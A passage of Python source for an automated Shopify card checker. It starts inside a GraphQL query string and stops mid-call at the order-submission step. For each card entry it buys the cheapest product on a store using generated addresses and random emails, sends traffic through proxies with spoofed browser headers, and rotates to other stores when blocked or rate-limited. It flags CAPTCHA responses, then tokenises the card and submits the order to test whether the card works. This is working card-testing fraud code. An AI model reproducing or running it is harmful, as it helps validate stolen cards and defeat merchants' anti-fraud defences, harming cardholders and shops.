__typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""


# ─── CAPTCHA DETECTOR (merged from shop.py) ──────────────────────────────────
def is_captcha_required(response_text: str) -> bool:
    """
    Return True when the Shopify checkout response signals a CAPTCHA challenge.
    Covers hCaptcha and the internal CAPTCHA_REQUIRED error code.
    Safe to call on None / empty strings.
    """
    if not response_text:
        return False
    indicators = [
        'CAPTCHA_REQUIRED', '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'", '"message":"CAPTCHA_REQUIRED"',
        'captcha required', 'CAPTCHA CHALLENGE', 'hcaptcha', 'h-captcha',
    ]
    upper = response_text.upper()
    return any(ind.upper() in upper for ind in indicators)


async def _make_gql_request(session, graphql_url, params, headers, json_data,
                             max_retries=1):
    """
    Thin async wrapper around session.post for GraphQL calls.
    Retries once on connection errors; returns (response, text) or (None, err).

    Replaces make_graphql_request_with_captcha_handling from shop.py but strips
    the captcha-solving side-effect (the caller decides what to do on captcha).
    """
    last_err = ""
    for attempt in range(max_retries + 1):
        try:
            resp = await session.post(graphql_url, params=params,
                                      headers=headers, json=json_data)
            text = await resp.text()
            return resp, text
        except Exception as exc:
            last_err = str(exc)
            if attempt < max_retries:
                import asyncio as _asyncio; await _asyncio.sleep(0.2)  # خُفِّض من 1s إلى 0.2s
    return None, last_err


async def run_checkout_for_card_async(shop_url: str,
                                      card_entry: str,
                                      proxy_url: str = "") -> "CheckResult":
    """
    Async replacement for run_checkout_for_card().

    Uses aiohttp + inline GraphQL queries (QUERY_PROPOSAL_SHIPPING, etc.)
    instead of curl_cffi + persisted-query IDs.  Returns the same CheckResult
    dataclass so check_card_with_retry() needs no other changes.

    Steps
    -----
    0. Fetch cheapest product variant
    1. Add-to-cart → checkout page (get SST, stableId, merch IDs, …)
    2. Shipping proposal  (2× calls — Shopify expects a double-tap)
    3. Delivery proposal  (commit selected shipping method)
    4. Tokenise card via PCI vault
    5. SubmitForCompletion
    6. PollForReceipt     (up to 4 retries)
    """
    import asyncio as _asyncio
    import json as _json
    from urllib.parse import urlparse as _urlparse

    result = CheckResult(card=card_entry, status=CheckStatus.ERROR,
                         shop_url=shop_url,
                         site_name=shop_url.replace("https://","").replace("http://",""))

    # ── parse card entry ──────────────────────────────────────────────────────
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as exc:
        result.error = exc
        return result

    # Reject Discover immediately (Shopify doesn't accept it)
    _cn = card_number.replace(" ","").replace("-","")
    _is_discover = (
        _cn[:4] == "6011" or _cn[:2] == "65"
        or (len(_cn) >= 6 and 622126 <= int(_cn[:6]) <= 622925)
        or (len(_cn) >= 3 and 644 <= int(_cn[:3]) <= 649)
    )
    if _is_discover:
        result.status      = CheckStatus.DECLINED
        result.status_code = "Unsupported card brand: discover"
        result.error       = Exception("Unsupported card brand: discover")
        return result

    # ── build proxy dict for aiohttp ─────────────────────────────────────────
    proxy = None
    if proxy_url:
        proxy = proxy_url  # aiohttp accepts the string directly

    ourl = shop_url if shop_url.startswith("http") else f"https://{shop_url}"

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": ourl,
        "Referer": ourl,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    connector = _aiohttp.TCPConnector(ssl=False)
    timeout   = _aiohttp.ClientTimeout(total=120)  # رُفع من 55 إلى 120 ثانية: يتيح للمتاجر البطيئة إكمال الدفع

    try:
        async with _aiohttp.ClientSession(connector=connector,
                                          timeout=timeout) as session:

            # ── Step 0: find cheapest product ────────────────────────────────
            # 402 = password-protected store; empty JSON = dead/blocking store.
            # Both are site-level, not card-level — set retryable=False so
            # check_card_with_retry rotates to a different site instead of
            # hammering the same one.
            try:
                pinfo = await _asyncio.wait_for(
                    _asyncio.to_thread(
                        find_cheapest_product,
                        TLSClient(timeout=20, proxy_url=proxy_url or ""),
                        ourl),
                    timeout=25
                )
                _, _, variant_id, price = pinfo
                result.amount = price
            except _asyncio.TimeoutError:
                result.retryable = False
                result.error = Exception("Step 0 failed: timeout finding product")
                return result
            except Exception as exc:
                err_str = str(exc)
                is_site_block = any(x in err_str for x in [
                    "402", "403", "401", "404",
                    "Expecting value",           # empty JSON body
                    "all products sold out",
                    "no products",
                ])
                result.retryable = not is_site_block
                result.error = Exception(f"Step 0 failed: {exc}")
                return result

            # ── Step 1: cart → checkout page ─────────────────────────────────
            try:
                cart_url     = ourl + "/cart/add.js"
                checkout_url_path = ourl + "/checkout/"

                cart_headers = {**base_headers,
                                 "Content-Type": "application/x-www-form-urlencoded",
                                 "Accept": "application/json, text/javascript"}
                # First attempt: form-encoded
                cart_resp = await session.post(cart_url,
                                               data=f"id={variant_id}&quantity=1",
                                               headers=cart_headers, proxy=proxy)

                # 429 → rate-limited: wait and retry once with JSON body
                if cart_resp.status == 429:
                    await _asyncio.sleep(1.5)  # خُفِّض من 6s إلى 1.5s
                    cart_headers_j = {**base_headers, "Content-Type": "application/json"}
                    cart_resp = await session.post(
                        cart_url,
                        json={"items": [{"id": int(variant_id), "quantity": 1}]},
                        headers=cart_headers_j, proxy=proxy)

                # Non-200 but not 429 → try JSON body once before giving up
                elif cart_resp.status != 200:
                    cart_headers_j = {**base_headers, "Content-Type": "application/json"}
                    cart_resp = await session.post(
                        cart_url,
                        json={"items": [{"id": int(variant_id), "quantity": 1}]},
                        headers=cart_headers_j, proxy=proxy)

                if cart_resp.status != 200:
                    st = cart_resp.status
                    # 403/401 = store blocked us (WAF, Cloudflare, login-wall)
                    # 429 still = still rate-limited → both are site-level, rotate site
                    site_block = st in (401, 403, 429, 451)
                    result.retryable = not site_block
                    result.error = Exception(f"Step 1 failed: cart status {st}")
                    return result

                co_hdrs = {**base_headers,
                            "Accept": "text/html,application/xhtml+xml,*/*",
                            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"}
                co_resp      = await session.post(checkout_url_path,
                                                  allow_redirects=True,
                                                  headers=co_hdrs, proxy=proxy)
                checkout_url = str(co_resp.url)
                html_text    = await co_resp.text()

                if "login" in checkout_url.lower():
                    result.error = Exception("Site requires login")
                    return result

                # ── Extract tokens from checkout HTML ──────────────────────
                attempt_token_m = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
                attempt_token   = (attempt_token_m.group(1) if attempt_token_m
                                   else checkout_url.split("/")[-1].split("?")[0])

                sst = (co_resp.headers.get("X-Checkout-One-Session-Token")
                       or co_resp.headers.get("x-checkout-one-session-token"))
                if not sst:
                    for pat in [
                        ('name="serialized-sessionToken" content="&quot;', '&quot;'),
                        ('name="serialized-sessionToken" content="', '"'),
                        ('"serializedSessionToken":"', '"'),
                        ('data-session-token="', '"'),
                        ('"sessionToken":"', '"'),
                    ]:
                        sst = extract_between(html_text, pat[0], pat[1])
                        if sst: break
                if not sst:
                    result.retryable = True
                    result.error = Exception("Step 1 failed: no session token")
                    return result

                queue_token = (extract_between(html_text, 'queueToken&quot;:&quot;', '&quot;')
                               or extract_between(html_text, '"queueToken":"', '"'))
                stable_id_a = (extract_between(html_text, 'stableId&quot;:&quot;', '&quot;')
                               or extract_between(html_text, '"stableId":"', '"'))
                merch       = (extract_between(html_text, 'ProductVariantMerchandise/', '&quot;')
                               or extract_between(html_text, 'ProductVariantMerchandise/', '&q')
                               or extract_between(html_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                               or str(variant_id))

                currency = "USD"
                if 'currencyCode&quot;:&quot;' in html_text:
                    currency = extract_between(html_text, 'currencyCode&quot;:&quot;', '&quot;') or "USD"
                elif '"currencyCode":"' in html_text:
                    currency = extract_between(html_text, '"currencyCode":"', '"') or "USD"
                result.currency = currency

                # Try HTML-escaped variant first, then plain JSON variant
                subtotal = extract_between(
                    html_text,
                    'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                    '&quot;',
                )
                if not subtotal:
                    subtotal = extract_between(
                        html_text,
                        '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"',
                        '"',
                    )
                if not subtotal:
                    pm = re.search(r'"price":\s*"([\d.]+)"', html_text)
                    subtotal = pm.group(1) if pm else "0.01"

                unesc = html_text.replace("&quot;", '"').replace("&amp;", "&")
                build_id_m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unesc)
                build_id   = build_id_m.group(1) if build_id_m else ""

                src_tok = extract_between(html_text, 'name="serialized-sourceToken" content="', '"')
                if src_tok:
                    src_tok = src_tok.replace("&quot;", "").strip('"')

                ident_sig_m = re.search(
                    r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unesc)
                ident_sig   = ident_sig_m.group(1) if ident_sig_m else ""

                # ── Update headers with checkout-specific values ───────────
                base_headers.update({
                    "shopify-checkout-client":  "checkout-web/1.0",
                    "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
                    "x-checkout-one-session-token": sst,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                })
                if build_id:
                    base_headers["x-checkout-web-build-id"]         = build_id
                    base_headers["x-checkout-web-deploy-stage"]      = "production"
                    base_headers["x-checkout-web-server-handling"]   = "fast"
                    base_headers["x-checkout-web-server-rendering"]  = "yes"
                if src_tok:
                    base_headers["x-checkout-web-source-id"] = src_tok

            except Exception as exc:
                result.retryable = True
                result.error = Exception(f"Step 1 failed: {exc}")
                return result

            # ── pick address ──────────────────────────────────────────────────
            addr = address_for_country("US")
            firstName, lastName = addr.first_name.capitalize(), addr.last_name.capitalize()
            email    = generate_random_email()
            street   = addr.address1
            city     = addr.city
            state    = addr.zone_code
            s_zip    = addr.postal_code
            phone    = addr.phone
            country_code = addr.country_code
            address2 = addr.address2

            graphql_url = f"https://{_urlparse(ourl).netloc}/checkouts/unstable/graphql"
            params      = {"operationName": "Proposal"}

            # ── Step 2: Shipping proposal ─────────────────────────────────────
            try:
                shipping_json = {
                    "query": QUERY_PROPOSAL_SHIPPING,
                    "variables": {
                        "sessionInput": {"sessionToken": sst},
                        "queueToken": queue_token or "",
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [{
                                "destination": {
                                    "partialStreetAddress": {
                                        "address1": street, "address2": address2,
                                        "city": city, "countryCode": country_code,
                                        "postalCode": s_zip, "firstName": firstName,
                                        "lastName": lastName, "zoneCode": state, "phone": phone
                                    }
                                },
                                "selectedDeliveryStrategy": {
                                    "deliveryStrategyMatchingConditions": {
                                        "estimatedTimeInTransit": {"any": True},
                                        "shipments": {"any": True}
                                    },
                                    "options": {}
                                },
                                "targetMerchandiseLines": {"any": True},
                                "deliveryMethodTypes": ["SHIPPING"],
                                "expectedTotalPrice": {"any": True},
                                "destinationChanged": True
                            }],
                            "noDeliveryRequired": [],
                            "useProgressiveRates": False,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping": True
                        },
                        "deliveryExpectations": {"deliveryExpectationLines": []},
                        "merchandise": {
                            "merchandiseLines": [{
                                "stableId": stable_id_a or "1",
                                "merchandise": {
                                    "productVariantReference": {
                                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                                    }
                                },
                                "quantity": {"items": {"value": 1}},
                                "expectedTotalPrice": {
                                    "value": {"amount": subtotal, "currencyCode": currency}
                                },
                                "lineComponentsSource": None, "lineComponents": []
                            }]
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": "", "city": "", "countryCode": country_code,
                                    "lastName": "", "zoneCode": "ENG", "phone": ""
                                }
                            }
                        },
                        "buyerIdentity": {
                            "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                            "email": email, "emailChanged": False,
                            "phoneCountryCode": country_code,
                            "marketingConsent": [{"email": {"value": email}}],
                            "shopPayOptInPhone": {"countryCode": country_code},
                            "rememberMe": False
                        },
                        "tip": {"tipLines": []},
                        "taxes": {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": []
                        },
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "scriptFingerprint": {
                            "signature": None, "signatureUuid": None,
                            "lineItemScriptChanges": [], "paymentScriptChanges": [],
                            "shippingScriptChanges": []
                        },
                        "optionalDuties": {"buyerRefusesDuties": False}
                    },
                    "operationName": "Proposal"
                }

                # Shopify expects the shipping proposal twice
                for _i in range(2):
                    _r, resp_text = await _make_gql_request(
                        session, graphql_url, params, base_headers, shipping_json)
                    if _i == 0:
                        await _asyncio.sleep(0.8)  # خُفِّض من 3s إلى 0.8s

                if is_captcha_required(resp_text):
                    result.error = Exception("CAPTCHA_REQUIRED")
                    return result

                rj = _json.loads(resp_text)
                if "errors" in rj:
                    msgs = "; ".join(e.get("message", str(e)) for e in rj["errors"][:3])
                    result.error = Exception(f"Step 2 GraphQL error: {msgs}")
                    return result

                sess_d    = rj.get("data", {}).get("session", {})
                neg_d     = (sess_d or {}).get("negotiate", {})
                neg_res   = (neg_d or {}).get("result", {})
                res_type  = (neg_res or {}).get("__typename", "")

                if res_type in ("CheckpointDenied", "Throttled", "NegotiationResultFailed"):
                    result.retryable = (res_type == "Throttled")
                    result.error = Exception(res_type)
                    return result

                checkpoint_data = (neg_res or {}).get("checkpointData")
                seller_prop     = (neg_res or {}).get("sellerProposal")
                if not seller_prop:
                    result.retryable = True
                    result.error = Exception("Step 2: seller proposal null")
                    return result

                running_total_v = (seller_prop.get("runningTotal") or {})
                running_total   = (running_total_v.get("value") or {}).get("amount", "0.00")

                delivery_data  = seller_prop.get("delivery", {})
                delivery_type  = (delivery_data or {}).get("__typename", "")
                delivery_strategy = ""
                shipping_amount   = 0.0

                if delivery_type == "FilledDeliveryTerms":
                    d_lines = (delivery_data or {}).get("deliveryLines", [{}])
                    if d_lines:
                        avail = d_lines[0].get("availableDeliveryStrategies", [])
                        if avail:
                            delivery_strategy = avail[0].get("handle", "")
                            try:
                                shipping_amount = float(
                                    avail[0].get("amount", {}).get("value", {}).get("amount", "0"))
                            except Exception:
                                shipping_amount = 0.0

                tax_data   = seller_prop.get("tax", {})
                tax_amount = 0.0
                if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                    try:
                        tax_amount = float(
                            tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
                    except Exception:
                        pass

                payment_data    = seller_prop.get("payment", {})
                payment_identifier = None
                gateway           = "Shopify Payments"
                if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                    for meth in payment_data.get("availablePaymentLines", []):
                        pm = meth.get("paymentMethod", {})
                        if pm.get("paymentMethodIdentifier") or pm.get("name"):
                            payment_identifier = pm.get("paymentMethodIdentifier")
                            gateway = (pm.get("extensibilityDisplayName")
                                       or pm.get("name", "Shopify Payments"))
                            break

            except Exception as exc:
                result.retryable = True
                result.error = Exception(f"Step 2 failed: {exc}")
                return result

            # ── Step 3: Delivery proposal ─────────────────────────────────────
            try:
                delivery_json = _json.loads(_json.dumps(shipping_json))  # deep copy
                delivery_json["query"] = QUERY_PROPOSAL_DELIVERY
                delivery_json["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy or "",
                        "customDeliveryRate": False
                    },
                    "options": {}
                }
                delivery_json["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {
                    "lines": [{"stableId": stable_id_a or "1"}]
                }
                delivery_json["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
                    "value": {"amount": str(shipping_amount), "currencyCode": currency}
                }
                delivery_json["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
                delivery_json["variables"]["payment"]["billingAddress"] = {
                    "streetAddress": {
                        "address1": street, "address2": address2, "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone
                    }
                }
                delivery_json["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
                delivery_json["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

                _rd, del_text = await _make_gql_request(
                    session, graphql_url, params, base_headers, delivery_json)

                if is_captcha_required(del_text):
                    result.error = Exception("CAPTCHA_REQUIRED on delivery")
                    return result

                # Fallback: extract payment_identifier from delivery response
                if not payment_identifier:
                    try:
                        drj = _json.loads(del_text)
                        dp = ((drj.get("data") or {})
                              .get("session", {}) or {})
                        dp = (dp.get("negotiate", {}) or {})
                        dp = (dp.get("result", {}) or {})
                        dp = (dp.get("sellerProposal", {}) or {})
                        dp_pay = dp.get("payment", {}) or {}
                        if dp_pay.get("__typename") == "FilledPaymentTerms":
                            for m in dp_pay.get("availablePaymentLines", []):
                                pm2 = m.get("paymentMethod", {})
                                if pm2.get("paymentMethodIdentifier") or pm2.get("name"):
                                    payment_identifier = pm2.get("paymentMethodIdentifier")
                                    gateway = (pm2.get("extensibilityDisplayName")
                                               or pm2.get("name", "Shopify Payments"))
                                    break
                    except Exception:
                        pass

                if not payment_identifier:
                    result.error = Exception("No valid payment method found")
                    return result

                total_price = str(float(running_total) + shipping_amount + tax_amount)
                result.amount = total_price

            except Exception as exc:
                result.retryable = True
                result.error = Exception(f"Step 3 failed: {exc}")
                return result

            # ── Step 4: PCI card tokenisation ─────────────────────────────────
            try:
                card_name_str = f"{firstName} {lastName}"
                pci_payload   = {
                    "credit_card": {
                        "number": card_number, "month": int(card_month),
                        "year": int(card_year), "verification_value": card_cvv,
                        "start_month": None, "start_year": None,
                        "issue_number": "", "name": card_name_str
                    },
                    "payment_session_scope": _urlparse(ourl).netloc
                }
                vault_headers = {
                    "Content-Type": "application/json", "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Origin": "https://checkout.pci.shopifyinc.com",
                    "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html",
                    "User-Agent": base_headers["User-Agent"],
                    "sec-ch-ua": base_headers["sec-ch-ua"],
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-storage-access": "active",
                }
                if ident_sig:
                    vault_headers["shopify-identification-signature"] = ident_sig

                # Primary PCI vault
                _PCI_PRIMARY  = "https://checkout.pci.shopifyinc.com/sessions"
                _PCI_FALLBACK = "https://checkout.pci.shopifycs.com/sessions"

                async def _post_pci(vault_url):
                    """POST to a PCI vault; return token str or None."""
                    try:
                        r = await session.post(
                            vault_url,
                            json=pci_payload, headers=vault_headers, proxy=proxy)
                        # Always read as text first — a 403 returns text/html
                        # and aiohttp's .json() raises ContentTypeError on it.
                        raw = await r.text()
                        if r.status != 200 or not raw.strip().startswith("{"):
                            return None
                        return _json.loads(raw).get("id")
                    except Exception:
                        return None

                token = await _post_pci(_PCI_PRIMARY)

                # Fallback: swap host (some stores pin to shopifycs instead)
                if not token:
                    token = await _post_pci(_PCI_FALLBACK)

                if not token:
                    result.error = Exception("PCI tokenisation failed: no session id")
                    return result
            except Exception as exc:
                result.error = Exception(f"Step 4 failed: {exc}")
                return result

            # ── Step 5: SubmitForCompletion ───────────────────────────────────
            try:
                submit_params = {"operationName": "SubmitForCompletion"}
                submit_vars   = {
                    "input": {
                        "sessionInput": {"sessionToken": sst},
                        "queueToken": queue_token or "",
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [{
                                "destination": {
                                    "streetAddress": {
                                        "address1": street, "address2": address2,
                                        "city": city, "countryCode": country_code,
                                        "postalCode": s_zip, "firstName": firstName,
                                        "lastName": lastName, "zoneCode": state, "phone": phone
                                    }
                                },
                                "selectedDeliveryStrategy": {
                                    "deliveryStrategyByHandle": {
                                        "handle": delivery_strategy or "",
                                        "customDeliveryRate": False
                                    },
                                    "options": {"phone": phone}
                                },
                                "targetMerchandiseLines": {
                                    "lines": [{"stableId": stable_id_a or "1"}]
                                },
                                "deliveryMethodTypes": ["SHIPPING"],
                                "expectedTotalPrice": {
                                    "value": {"amount": str(shipping_amount), "currencyCode": currency}
                                },
                                "destinationChanged": False
                            }],
                            "noDeliveryRequired": [],
                            "useProgressiveRates": True,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping": True
                        },
                        "merchandise": {
                            "merchandiseLines": [{
                                "stableId": stable_id_a or "1",
                                "merchandise": {
                                    "productVariantReference": {
                                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                        "properties": [], "sellingPlanId": None,
                                        "sellingPlanDigest": None
                                    }
                                },
                                "quantity": {"items": {"value": 1}},
                                "expectedTotalPrice": {
                                    "value": {"amount": subtotal, "currencyCode": currency}
                                },
                                "lineComponentsSource": None, "lineComponents": []
                            }]
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [{
                                "paymentMethod": {
                                    "directPaymentMethod": {
                                        "paymentMethodIdentifier": payment_identifier,
                                        "sessionId": token,
                                        "billingAddress": {
                                            "streetAddress": {
                                                "address1": street, "address2": address2,
                                                "city": city, "countryCode": country_code,
                                                "postalCode": s_zip, "firstName": firstName,
                                                "lastName": lastName, "zoneCode": state,
                                                "phone": phone
                                            }
                                        },
                                        "cardSource": None
                                    }
                                },
                                "amount": {
                                    "value": {"amount": running_total, "currencyCode": currency}
                                },
                                "dueAt": None
                            }],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": street, "address2": address2,
                                    "city": city, "countryCode": country_code,
                                    "postalCode": s_zip, "firstName": firstName,
                                    "lastName": lastName, "zoneCode": state, "phone": phone
                                }
                            }
                        },
                        "buyerIdentity": {
                            "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                            "email": email, "emailChanged": False,
                            "phoneCountryCode": country_code,
                            "marketingConsent": [{"email": {"value": email}}],
                            "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                            "rememberMe": False
                        },
                        "taxes": {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {
                                "value": {"amount": str(tax_amount), "currencyCode": currency}
                            },
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": []
                        },
                        "tip": {"tipLines": []},
                        "note": {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "optionalDuties": {"buyerRefusesDuties": False}
                    },
                    "attemptToken": attempt_token,
                    "metafields": [],
                    "analytics": {"requestUrl": checkout_url}
                }
                if checkpoint_data:
                    submit_vars["input"]["checkpointData"] = checkpoint_data

                submit_json = {
                    "query": MUTATION_SUBMIT,
                    "variables": submit_vars,
                    "operationName": "SubmitForCompletion"
                }

                _rs, sub_text = await _make_gql_request(
